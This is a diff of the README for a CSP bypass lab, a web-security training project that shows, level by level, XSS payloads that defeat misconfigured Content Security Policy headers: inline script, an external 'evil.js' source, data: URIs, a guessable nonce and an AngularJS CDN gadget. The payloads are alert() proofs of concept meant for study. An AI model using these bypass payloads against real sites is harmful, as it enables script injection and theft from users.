@@ -1,10 +1,10 @@
 # CSP Bypass Lab
-Bypass project of CSP security standard, which is a protection method for XSS vulnerability.
-
-http://cspbypass.ml
+Bypass project of CSP security standard, which is a protection method for XSS vulnerability. 
+This project contains sample test cases for bypassing incorrectly&incompletely configured CSP headers. 
 
 ## What is CSP
-Content Security Policy is a computer security standard that was introduced to prevent cross-site scripting, click-through, and other code injection attacks resulting from the execution of malicious content in the context of a trusted web page.
+Content Security Policy is a computer security standard that was introduced to prevent cross-site scripting, click-through, and other code injection attacks resulting from the execution of malicious content in the context of a trusted web page. 
+
 ## Challenges
 - unsafe-inline
 - External Resource
@@ -15,32 +15,38 @@ Content Security Policy is a computer security standard that was introduced to p
 
 ## Solutions
 Check https://csp-evaluator.withgoogle.com before solutions.
+
 #### Level 1
 As a result of the 'unsafe-inline' directive used, if the input entered contains a script tag, the javascript is triggered. Example payload 
 
 ```sh
 <script>alert(1)</script>
 ```
+
 #### Level 2
 JS codes from yourjavascript.com, which is an external resource, will be allowed. It is triggered by malicious JS code. Go to yourjavascript.com , create malicious code and upload.
+
 ```sh
 <script type="text/javascript" src="http://yourjavascript.com/0513280132/evil.js"></script>
 ```
 
 #### Level 3
 data: URI in script-src allows the execution of unsafe scripts.
+
 ```sh
 <script src=data:text/javascript,alert(1337)></script>
 ```
 
 ### Level 4
 We see the base64 encode form of current time's as the nonce value in response as the CSP rule. Example payload
+
 ```sh
 <script nonce="MjcuMDMuMjAyMS8yMjoxNw==">alert(1)</script>
 ```
 
 ### Level 5
 One of the most used JavaScript CDNs is cdnjs.cloudflare.com. At this level, we will try to trigger XSS on a page that has Cloudflare allowed CDN resources.
+
 ```sh
 <Script Src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js> </Script><K Ng-App>{{$new.constructor('alert(1)')()}}
 ```
@@ -52,6 +58,7 @@ Same as the previous level, here you can use callback functions.
 Given this CSP header:
 Content-Security-Policy: frame-src https://example.com
 The following <iframe> is blocked and won't load:
+  
 ```sh
 <iframe src="https://not-example.com/"></iframe>
 ```
@@ -59,9 +66,5 @@ The following <iframe> is blocked and won't load:
 Call the allowed page in Frame.
 
 ##### Useful Resources
-
-- https://www.netsparker.com/blog/web-security/content-security-policy/
 - https://brutelogic.com.br/blog/csp-bypass-guidelines/
 - https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy
-
-
